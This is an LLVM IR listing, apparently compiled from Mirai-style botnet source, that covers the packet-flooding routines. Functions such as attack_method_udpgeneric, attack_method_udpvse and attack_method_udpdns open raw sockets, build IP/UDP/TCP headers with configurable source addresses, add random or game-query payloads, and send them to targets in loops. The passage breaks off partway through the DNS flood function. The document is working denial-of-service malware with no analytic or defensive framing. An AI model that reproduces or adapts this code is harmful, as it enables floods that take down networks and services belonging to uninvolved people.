  %152 = getelementptr inbounds i8, i8* %147, i64 1
  store i8 %16, i8* %152, align 1
  %153 = call zeroext i16 @htons(i16 zeroext %63) #11
  %154 = getelementptr inbounds i8, i8* %147, i64 2
  %155 = bitcast i8* %154 to i16*
  store i16 %153, i16* %155, align 2
  %156 = call zeroext i16 @htons(i16 zeroext %18) #11
  %157 = getelementptr inbounds i8, i8* %147, i64 4
  %158 = bitcast i8* %157 to i16*
  store i16 %156, i16* %158, align 4
  %159 = getelementptr inbounds i8, i8* %147, i64 8
  store i8 %20, i8* %159, align 4
  br i1 %64, label %164, label %160

; <label>:160:                                    ; preds = %131
  %161 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %162 = getelementptr inbounds i8, i8* %147, i64 6
  %163 = bitcast i8* %162 to i16*
  store i16 %161, i16* %163, align 2
  br label %164

; <label>:164:                                    ; preds = %131, %160
  %165 = getelementptr inbounds i8, i8* %147, i64 9
  store i8 6, i8* %165, align 1
  %166 = load i32, i32* @LOCAL_ADDR, align 4
  %167 = getelementptr inbounds i8, i8* %147, i64 12
  %168 = bitcast i8* %167 to i32*
  store i32 %166, i32* %168, align 4
  %169 = getelementptr inbounds i8, i8* %147, i64 16
  %170 = bitcast i8* %169 to i32*
  store i32 %117, i32* %170, align 4
  %171 = bitcast i8* %149 to i16*
  store i16 %144, i16* %171, align 4
  %172 = getelementptr inbounds i8, i8* %147, i64 22
  %173 = bitcast i8* %172 to i16*
  store i16 %124, i16* %173, align 2
  %174 = getelementptr inbounds i8, i8* %147, i64 24
  %175 = bitcast i8* %174 to i32*
  store i32 %141, i32* %175, align 4
  %176 = getelementptr inbounds i8, i8* %147, i64 28
  %177 = bitcast i8* %176 to i32*
  store i32 %137, i32* %177, align 4
  %178 = getelementptr inbounds i8, i8* %147, i64 32
  %179 = bitcast i8* %178 to i16*
  %180 = getelementptr inbounds i8, i8* %147, i64 34
  %181 = bitcast i8* %180 to i16*
  store i16 0, i16* %181, align 2
  store i16 %81, i16* %179, align 4
  call void @rand_str(i8* %151, i32 %37)
  br label %.loopexit152

; <label>:182:                                    ; preds = %127
  %183 = and i16 %128, 1280
  %184 = icmp eq i16 %183, 0
  br i1 %184, label %189, label %185

; <label>:185:                                    ; preds = %182
  %186 = call i32 @close(i32 %92) #10
  br label %.backedge

.backedge:                                        ; preds = %185, %193
  %187 = call i32 @socket(i32 2, i32 1, i32 0) #10
  %188 = icmp eq i32 %187, -1
  br i1 %188, label %.loopexit152.loopexit, label %.lr.ph161

; <label>:189:                                    ; preds = %182, %123, %120, %116
  %190 = call i64 @time(i64* null) #10
  %191 = sub nsw i64 %190, %111
  %192 = icmp sgt i64 %191, 10
  br i1 %192, label %193, label %112

; <label>:193:                                    ; preds = %189
  %194 = call i32 @close(i32 %92) #10
  br label %.backedge

.loopexit152.loopexit:                            ; preds = %.backedge
  br label %.loopexit152

.loopexit152:                                     ; preds = %.loopexit152.loopexit, %.preheader151, %164
  %.1 = phi %struct.tcphdr* [ %150, %164 ], [ %.0162, %.preheader151 ], [ %.0162, %.loopexit152.loopexit ]
  %195 = load i32, i32* %5, align 4
  %196 = add nsw i32 %195, 1
  store i32 %196, i32* %5, align 4
  %197 = icmp slt i32 %196, %46
  br i1 %197, label %.preheader151, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %209
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %47, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %209
  %storemerge139160 = phi i32 [ %243, %209 ], [ 0, %.lr.ph.preheader ]
  %198 = sext i32 %storemerge139160 to i64
  %199 = getelementptr inbounds i8*, i8** %14, i64 %198
  %200 = load i8*, i8** %199, align 8
  %201 = bitcast i8* %200 to %struct.iphdr*
  %202 = getelementptr inbounds i8, i8* %200, i64 20
  %203 = getelementptr inbounds i8, i8* %200, i64 40
  br i1 %87, label %204, label %207

; <label>:204:                                    ; preds = %.lr.ph
  %205 = getelementptr inbounds i8, i8* %200, i64 4
  %206 = bitcast i8* %205 to i16*
  store i16 0, i16* %206, align 4
  br label %207

; <label>:207:                                    ; preds = %204, %.lr.ph
  br i1 %88, label %209, label %208

; <label>:208:                                    ; preds = %207
  call void @rand_str(i8* %203, i32 %37)
  %.pre = load i32, i32* %5, align 4
  br label %209

; <label>:209:                                    ; preds = %207, %208
  %210 = phi i32 [ %storemerge139160, %207 ], [ %.pre, %208 ]
  %211 = getelementptr inbounds i8, i8* %200, i64 10
  %212 = bitcast i8* %211 to i16*
  store i16 0, i16* %212, align 2
  %213 = bitcast i8* %200 to i16*
  %214 = call zeroext i16 @checksum_generic(i16* %213, i32 20)
  store i16 %214, i16* %212, align 2
  %215 = sext i32 %210 to i64
  %216 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %215, i32 1
  %217 = load i32, i32* %216, align 4
  %218 = add i32 %217, 1
  store i32 %218, i32* %216, align 4
  %219 = trunc i32 %217 to i16
  %220 = call zeroext i16 @htons(i16 zeroext %219) #11
  %221 = zext i16 %220 to i32
  %222 = getelementptr inbounds i8, i8* %200, i64 24
  %223 = bitcast i8* %222 to i32*
  store i32 %221, i32* %223, align 4
  %224 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %215, i32 2
  %225 = load i32, i32* %224, align 4
  %226 = trunc i32 %225 to i16
  %227 = call zeroext i16 @htons(i16 zeroext %226) #11
  %228 = zext i16 %227 to i32
  %229 = getelementptr inbounds i8, i8* %200, i64 28
  %230 = bitcast i8* %229 to i32*
  store i32 %228, i32* %230, align 4
  %231 = getelementptr inbounds i8, i8* %200, i64 36
  %232 = bitcast i8* %231 to i16*
  store i16 0, i16* %232, align 4
  %233 = call zeroext i16 @htons(i16 zeroext %90) #11
  %234 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %201, i8* %202, i16 zeroext %233, i32 %91)
  store i16 %234, i16* %232, align 4
  %235 = getelementptr inbounds i8, i8* %200, i64 22
  %236 = bitcast i8* %235 to i16*
  %237 = load i16, i16* %236, align 2
  %238 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %215, i32 0, i32 1
  store i16 %237, i16* %238, align 2
  %239 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %215, i32 0
  %240 = bitcast %struct.sockaddr_in* %239 to %struct.sockaddr*
  %241 = call i64 @sendto(i32 %40, i8* %200, i64 %.pre-phi167, i32 16384, %struct.sockaddr* %240, i32 16) #10
  %242 = load i32, i32* %5, align 4
  %243 = add nsw i32 %242, 1
  store i32 %243, i32* %5, align 4
  %244 = icmp slt i32 %243, %46
  br i1 %244, label %.lr.ph, label %.loopexit.loopexit

.loopexit150.loopexit:                            ; preds = %112
  br label %.loopexit150

.loopexit150:                                     ; preds = %.loopexit150.loopexit, %4, %82
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpgeneric(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %22 = trunc i32 %21 to i16
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %24 = trunc i32 %23 to i8
  %25 = load i32, i32* @LOCAL_ADDR, align 4
  %26 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %25)
  %27 = and i32 %21, 65535
  %28 = icmp ugt i32 %27, 1460
  %. = select i1 %28, i16 1460, i16 %22
  %29 = tail call i32 @socket(i32 2, i32 3, i32 17) #10
  %30 = icmp eq i32 %29, -1
  br i1 %30, label %146, label %31

; <label>:31:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %32 = bitcast i32* %5 to i8*
  %33 = call i32 @setsockopt(i32 %29, i32 0, i32 3, i8* nonnull %32, i32 4) #10
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %41, label %.preheader84

.preheader84:                                     ; preds = %31
  store i32 0, i32* %5, align 4
  %35 = zext i8 %0 to i32
  %36 = icmp eq i8 %0, 0
  br i1 %36, label %.preheader, label %.lr.ph86

.lr.ph86:                                         ; preds = %.preheader84
  %37 = add i16 %., 28
  %38 = icmp eq i8 %16, 0
  %39 = add i16 %., 8
  %40 = zext i8 %0 to i64
  br label %57

; <label>:41:                                     ; preds = %31
  %42 = call i32 @close(i32 %29) #10
  br label %146

..preheader_crit_edge:                            ; preds = %73
  %43 = trunc i64 %indvars.iv.next to i32
  store i32 %43, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader84, %..preheader_crit_edge
  %44 = icmp eq i32 %26, -1
  %45 = and i32 %11, 65535
  %46 = icmp eq i32 %45, 65535
  %47 = and i32 %17, 65535
  %48 = icmp eq i32 %47, 65535
  %49 = and i32 %19, 65535
  %50 = icmp eq i32 %49, 65535
  %51 = icmp eq i8 %24, 0
  %52 = zext i16 %. to i64
  %53 = add nuw nsw i64 %52, 8
  %54 = trunc i64 %53 to i32
  %55 = add nuw nsw i64 %52, 28
  %56 = zext i16 %. to i32
  br label %.loopexit

; <label>:57:                                     ; preds = %.lr.ph86, %73
  %indvars.iv = phi i64 [ 0, %.lr.ph86 ], [ %indvars.iv.next, %73 ]
  %58 = call noalias i8* @calloc(i64 1510, i64 1) #10
  %59 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %58, i8** %59, align 8
  %60 = getelementptr inbounds i8, i8* %58, i64 20
  store i8 69, i8* %58, align 4
  %61 = getelementptr inbounds i8, i8* %58, i64 1
  store i8 %10, i8* %61, align 1
  %62 = call zeroext i16 @htons(i16 zeroext %37) #11
  %63 = getelementptr inbounds i8, i8* %58, i64 2
  %64 = bitcast i8* %63 to i16*
  store i16 %62, i16* %64, align 2
  %65 = call zeroext i16 @htons(i16 zeroext %12) #11
  %66 = getelementptr inbounds i8, i8* %58, i64 4
  %67 = bitcast i8* %66 to i16*
  store i16 %65, i16* %67, align 4
  %68 = getelementptr inbounds i8, i8* %58, i64 8
  store i8 %14, i8* %68, align 4
  br i1 %38, label %73, label %69

; <label>:69:                                     ; preds = %57
  %70 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %71 = getelementptr inbounds i8, i8* %58, i64 6
  %72 = bitcast i8* %71 to i16*
  store i16 %70, i16* %72, align 2
  br label %73

; <label>:73:                                     ; preds = %57, %69
  %74 = getelementptr inbounds i8, i8* %58, i64 9
  store i8 17, i8* %74, align 1
  %75 = getelementptr inbounds i8, i8* %58, i64 12
  %76 = bitcast i8* %75 to i32*
  store i32 %26, i32* %76, align 4
  %77 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %78 = load i32, i32* %77, align 4
  %79 = getelementptr inbounds i8, i8* %58, i64 16
  %80 = bitcast i8* %79 to i32*
  store i32 %78, i32* %80, align 4
  %81 = call zeroext i16 @htons(i16 zeroext %18) #11
  %82 = bitcast i8* %60 to i16*
  store i16 %81, i16* %82, align 2
  %83 = call zeroext i16 @htons(i16 zeroext %20) #11
  %84 = getelementptr inbounds i8, i8* %58, i64 22
  %85 = bitcast i8* %84 to i16*
  store i16 %83, i16* %85, align 2
  %86 = call zeroext i16 @htons(i16 zeroext %39) #11
  %87 = getelementptr inbounds i8, i8* %58, i64 24
  %88 = bitcast i8* %87 to i16*
  store i16 %86, i16* %88, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %89 = icmp slt i64 %indvars.iv.next, %40
  br i1 %89, label %57, label %..preheader_crit_edge

.loopexit.loopexit:                               ; preds = %123
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %36, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %123
  %storemerge8385 = phi i32 [ %144, %123 ], [ 0, %.lr.ph.preheader ]
  %90 = sext i32 %storemerge8385 to i64
  %91 = getelementptr inbounds i8*, i8** %8, i64 %90
  %92 = load i8*, i8** %91, align 8
  %93 = bitcast i8* %92 to %struct.iphdr*
  %94 = getelementptr inbounds i8, i8* %92, i64 20
  %95 = getelementptr inbounds i8, i8* %92, i64 28
  %96 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %90, i32 2
  %97 = load i8, i8* %96, align 4
  %98 = icmp ult i8 %97, 32
  br i1 %98, label %99, label %106

; <label>:99:                                     ; preds = %.lr.ph
  %100 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %90, i32 1
  %101 = load i32, i32* %100, align 4
  %102 = call i32 @ntohl(i32 %101) #11
  %103 = call i32 @htonl(i32 %102) #11
  %104 = getelementptr inbounds i8, i8* %92, i64 16
  %105 = bitcast i8* %104 to i32*
  store i32 %103, i32* %105, align 4
  br label %106

; <label>:106:                                    ; preds = %99, %.lr.ph
  br i1 %44, label %107, label %110

; <label>:107:                                    ; preds = %106
  %108 = getelementptr inbounds i8, i8* %92, i64 12
  %109 = bitcast i8* %108 to i32*
  store i32 0, i32* %109, align 4
  br label %110

; <label>:110:                                    ; preds = %107, %106
  br i1 %46, label %111, label %114

; <label>:111:                                    ; preds = %110
  %112 = getelementptr inbounds i8, i8* %92, i64 4
  %113 = bitcast i8* %112 to i16*
  store i16 0, i16* %113, align 4
  br label %114

; <label>:114:                                    ; preds = %111, %110
  br i1 %48, label %115, label %117

; <label>:115:                                    ; preds = %114
  %116 = bitcast i8* %94 to i16*
  store i16 0, i16* %116, align 2
  br label %117

; <label>:117:                                    ; preds = %115, %114
  br i1 %50, label %118, label %121

; <label>:118:                                    ; preds = %117
  %119 = getelementptr inbounds i8, i8* %92, i64 22
  %120 = bitcast i8* %119 to i16*
  store i16 0, i16* %120, align 2
  br label %121

; <label>:121:                                    ; preds = %118, %117
  br i1 %51, label %123, label %122

; <label>:122:                                    ; preds = %121
  call void @rand_str(i8* %95, i32 %56)
  %.pre = load i32, i32* %5, align 4
  br label %123

; <label>:123:                                    ; preds = %121, %122
  %124 = phi i32 [ %storemerge8385, %121 ], [ %.pre, %122 ]
  %125 = getelementptr inbounds i8, i8* %92, i64 10
  %126 = bitcast i8* %125 to i16*
  store i16 0, i16* %126, align 2
  %127 = bitcast i8* %92 to i16*
  %128 = call zeroext i16 @checksum_generic(i16* %127, i32 20)
  store i16 %128, i16* %126, align 2
  %129 = getelementptr inbounds i8, i8* %92, i64 26
  %130 = bitcast i8* %129 to i16*
  store i16 0, i16* %130, align 2
  %131 = getelementptr inbounds i8, i8* %92, i64 24
  %132 = bitcast i8* %131 to i16*
  %133 = load i16, i16* %132, align 2
  %134 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %93, i8* %94, i16 zeroext %133, i32 %54)
  store i16 %134, i16* %130, align 2
  %135 = getelementptr inbounds i8, i8* %92, i64 22
  %136 = bitcast i8* %135 to i16*
  %137 = load i16, i16* %136, align 2
  %138 = sext i32 %124 to i64
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %138, i32 0, i32 1
  store i16 %137, i16* %139, align 2
  %140 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %138, i32 0
  %141 = bitcast %struct.sockaddr_in* %140 to %struct.sockaddr*
  %142 = call i64 @sendto(i32 %29, i8* %92, i64 %55, i32 16384, %struct.sockaddr* %141, i32 16) #10
  %143 = load i32, i32* %5, align 4
  %144 = add nsw i32 %143, 1
  store i32 %144, i32* %5, align 4
  %145 = icmp slt i32 %144, %35
  br i1 %145, label %.lr.ph, label %.loopexit.loopexit

; <label>:146:                                    ; preds = %4, %41
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpvse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = zext i8 %0 to i64
  %8 = tail call noalias i8* @calloc(i64 %7, i64 8) #10
  %9 = bitcast i8* %8 to i8**
  %10 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %11 = trunc i32 %10 to i8
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %13 = trunc i32 %12 to i16
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %15 = trunc i32 %14 to i8
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %19 = trunc i32 %18 to i16
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 27015)
  %21 = trunc i32 %20 to i16
  tail call void @table_unlock_val(i8 zeroext 20)
  %22 = call i8* @table_retrieve_val(i32 20, i32* nonnull %6)
  %23 = call i32 @socket(i32 2, i32 3, i32 17) #10
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %135, label %25

; <label>:25:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %26 = bitcast i32* %5 to i8*
  %27 = call i32 @setsockopt(i32 %23, i32 0, i32 3, i8* nonnull %26, i32 4) #10
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %32, label %.preheader71

.preheader71:                                     ; preds = %25
  store i32 0, i32* %5, align 4
  %29 = zext i8 %0 to i32
  %30 = icmp eq i8 %0, 0
  br i1 %30, label %.preheader, label %.lr.ph73

.lr.ph73:                                         ; preds = %.preheader71
  %31 = icmp eq i8 %17, 0
  br label %40

; <label>:32:                                     ; preds = %25
  %33 = call i32 @close(i32 %23) #10
  br label %135

.preheader.loopexit:                              ; preds = %62
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader71
  %34 = and i32 %12, 65535
  %35 = icmp eq i32 %34, 65535
  %36 = and i32 %18, 65535
  %37 = icmp eq i32 %36, 65535
  %38 = and i32 %20, 65535
  %39 = icmp eq i32 %38, 65535
  br label %.loopexit

; <label>:40:                                     ; preds = %.lr.ph73, %62
  %41 = phi i32 [ 0, %.lr.ph73 ], [ %83, %62 ]
  %42 = call noalias i8* @calloc(i64 128, i64 1) #10
  %43 = sext i32 %41 to i64
  %44 = getelementptr inbounds i8*, i8** %9, i64 %43
  store i8* %42, i8** %44, align 8
  %45 = getelementptr inbounds i8, i8* %42, i64 20
  %46 = getelementptr inbounds i8, i8* %42, i64 28
  store i8 69, i8* %42, align 4
  %47 = getelementptr inbounds i8, i8* %42, i64 1
  store i8 %11, i8* %47, align 1
  %48 = load i32, i32* %6, align 4
  %49 = trunc i32 %48 to i16
  %50 = add i16 %49, 32
  %51 = call zeroext i16 @htons(i16 zeroext %50) #11
  %52 = getelementptr inbounds i8, i8* %42, i64 2
  %53 = bitcast i8* %52 to i16*
  store i16 %51, i16* %53, align 2
  %54 = call zeroext i16 @htons(i16 zeroext %13) #11
  %55 = getelementptr inbounds i8, i8* %42, i64 4
  %56 = bitcast i8* %55 to i16*
  store i16 %54, i16* %56, align 4
  %57 = getelementptr inbounds i8, i8* %42, i64 8
  store i8 %15, i8* %57, align 4
  br i1 %31, label %62, label %58

; <label>:58:                                     ; preds = %40
  %59 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %60 = getelementptr inbounds i8, i8* %42, i64 6
  %61 = bitcast i8* %60 to i16*
  store i16 %59, i16* %61, align 2
  br label %62

; <label>:62:                                     ; preds = %40, %58
  %63 = getelementptr inbounds i8, i8* %42, i64 9
  store i8 17, i8* %63, align 1
  %64 = load i32, i32* @LOCAL_ADDR, align 4
  %65 = getelementptr inbounds i8, i8* %42, i64 12
  %66 = bitcast i8* %65 to i32*
  store i32 %64, i32* %66, align 4
  %67 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %43, i32 1
  %68 = load i32, i32* %67, align 4
  %69 = getelementptr inbounds i8, i8* %42, i64 16
  %70 = bitcast i8* %69 to i32*
  store i32 %68, i32* %70, align 4
  %71 = call zeroext i16 @htons(i16 zeroext %19) #11
  %72 = bitcast i8* %45 to i16*
  store i16 %71, i16* %72, align 2
  %73 = call zeroext i16 @htons(i16 zeroext %21) #11
  %74 = getelementptr inbounds i8, i8* %42, i64 22
  %75 = bitcast i8* %74 to i16*
  store i16 %73, i16* %75, align 2
  %76 = add i16 %49, 12
  %77 = call zeroext i16 @htons(i16 zeroext %76) #11
  %78 = getelementptr inbounds i8, i8* %42, i64 24
  %79 = bitcast i8* %78 to i16*
  store i16 %77, i16* %79, align 2
  %80 = bitcast i8* %46 to i32*
  store i32 -1, i32* %80, align 4
  %81 = getelementptr inbounds i8, i8* %42, i64 32
  call void @util_memcpy(i8* %81, i8* %22, i32 %48) #10
  %82 = load i32, i32* %5, align 4
  %83 = add nsw i32 %82, 1
  store i32 %83, i32* %5, align 4
  %84 = icmp slt i32 %83, %29
  br i1 %84, label %40, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %112
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %30, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %112
  %85 = phi i32 [ %133, %112 ], [ 0, %.lr.ph.preheader ]
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds i8*, i8** %9, i64 %86
  %88 = load i8*, i8** %87, align 8
  %89 = bitcast i8* %88 to %struct.iphdr*
  %90 = getelementptr inbounds i8, i8* %88, i64 20
  %91 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %86, i32 2
  %92 = load i8, i8* %91, align 4
  %93 = icmp ult i8 %92, 32
  br i1 %93, label %94, label %101

; <label>:94:                                     ; preds = %.lr.ph
  %95 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %86, i32 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @ntohl(i32 %96) #11
  %98 = call i32 @htonl(i32 %97) #11
  %99 = getelementptr inbounds i8, i8* %88, i64 16
  %100 = bitcast i8* %99 to i32*
  store i32 %98, i32* %100, align 4
  br label %101

; <label>:101:                                    ; preds = %94, %.lr.ph
  br i1 %35, label %102, label %105

; <label>:102:                                    ; preds = %101
  %103 = getelementptr inbounds i8, i8* %88, i64 4
  %104 = bitcast i8* %103 to i16*
  store i16 0, i16* %104, align 4
  br label %105

; <label>:105:                                    ; preds = %102, %101
  br i1 %37, label %106, label %108

; <label>:106:                                    ; preds = %105
  %107 = bitcast i8* %90 to i16*
  store i16 0, i16* %107, align 2
  br label %108

; <label>:108:                                    ; preds = %106, %105
  %109 = getelementptr inbounds i8, i8* %88, i64 22
  %110 = bitcast i8* %109 to i16*
  br i1 %39, label %111, label %._crit_edge

._crit_edge:                                      ; preds = %108
  %.pre = load i16, i16* %110, align 2
  br label %112

; <label>:111:                                    ; preds = %108
  store i16 0, i16* %110, align 2
  br label %112

; <label>:112:                                    ; preds = %._crit_edge, %111
  %113 = phi i16 [ %.pre, %._crit_edge ], [ 0, %111 ]
  %114 = getelementptr inbounds i8, i8* %88, i64 10
  %115 = bitcast i8* %114 to i16*
  store i16 0, i16* %115, align 2
  %116 = bitcast i8* %88 to i16*
  %117 = call zeroext i16 @checksum_generic(i16* %116, i32 20)
  store i16 %117, i16* %115, align 2
  %118 = getelementptr inbounds i8, i8* %88, i64 26
  %119 = bitcast i8* %118 to i16*
  store i16 0, i16* %119, align 2
  %120 = getelementptr inbounds i8, i8* %88, i64 24
  %121 = bitcast i8* %120 to i16*
  %122 = load i16, i16* %121, align 2
  %123 = load i32, i32* %6, align 4
  %124 = add i32 %123, 12
  %125 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %89, i8* nonnull %90, i16 zeroext %122, i32 %124)
  store i16 %125, i16* %119, align 2
  %126 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %86, i32 0, i32 1
  store i16 %113, i16* %126, align 2
  %127 = sext i32 %123 to i64
  %128 = add nsw i64 %127, 32
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %86, i32 0
  %130 = bitcast %struct.sockaddr_in* %129 to %struct.sockaddr*
  %131 = call i64 @sendto(i32 %23, i8* nonnull %88, i64 %128, i32 16384, %struct.sockaddr* %130, i32 16) #10
  %132 = load i32, i32* %5, align 4
  %133 = add nsw i32 %132, 1
  store i32 %133, i32* %5, align 4
  %134 = icmp slt i32 %133, %29
  br i1 %134, label %.lr.ph, label %.loopexit.loopexit

; <label>:135:                                    ; preds = %4, %32
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpdns(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 53)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 9, i32 65535)
  %22 = trunc i32 %21 to i16
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 12)
  %24 = trunc i32 %23 to i8
  %25 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 8, i8* null)
  %26 = tail call fastcc i32 @get_dns_resolver()
  %27 = icmp eq i8* %25, null
  br i1 %27, label %179, label %28

; <label>:28:                                     ; preds = %4
  %29 = tail call i32 @util_strlen(i8* nonnull %25) #10
  %30 = tail call i32 @socket(i32 2, i32 3, i32 17) #10
  %31 = icmp eq i32 %30, -1
  br i1 %31, label %179, label %32

; <label>:32:                                     ; preds = %28
  store i32 1, i32* %5, align 4
  %33 = bitcast i32* %5 to i8*
  %34 = call i32 @setsockopt(i32 %30, i32 0, i32 3, i8* nonnull %33, i32 4) #10
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %50, label %.preheader122

.preheader122:                                    ; preds = %32
  store i32 0, i32* %5, align 4
  %36 = zext i8 %0 to i32
  %37 = icmp eq i8 %0, 0
  %.pre = and i32 %23, 255
  br i1 %37, label %.preheader122..preheader_crit_edge, label %.lr.ph130

.preheader122..preheader_crit_edge:               ; preds = %.preheader122
  %.pre133 = sext i32 %29 to i64
  br label %.preheader

.lr.ph130:                                        ; preds = %.preheader122
  %38 = zext i32 %.pre to i64
  %39 = sext i32 %29 to i64
  %40 = add nuw nsw i64 %38, 47
  %41 = add nsw i64 %40, %39
  %42 = trunc i64 %41 to i16
  %43 = icmp eq i8 %16, 0
  %44 = add nuw nsw i64 %38, 27
  %45 = add nsw i64 %44, %39
  %46 = trunc i64 %45 to i16
  %47 = add nsw i32 %29, 1
  %48 = icmp sgt i32 %29, 0
